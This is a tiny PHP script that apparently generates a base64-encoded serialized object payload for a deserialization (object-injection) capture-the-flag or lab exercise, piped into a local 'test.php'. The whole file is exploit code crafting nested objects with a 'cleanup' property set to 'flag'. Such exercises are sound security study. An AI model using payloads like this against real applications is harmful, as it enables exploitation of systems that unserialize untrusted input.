<?php
class X {}
class Y {}
$obj = new Y;
$obj->secret = new Y;
$obj->secret->secret = new X;
$obj->secret->secret->cleanup = "flag";
echo base64_encode(serialize($obj));
// php gen.php | php test.php
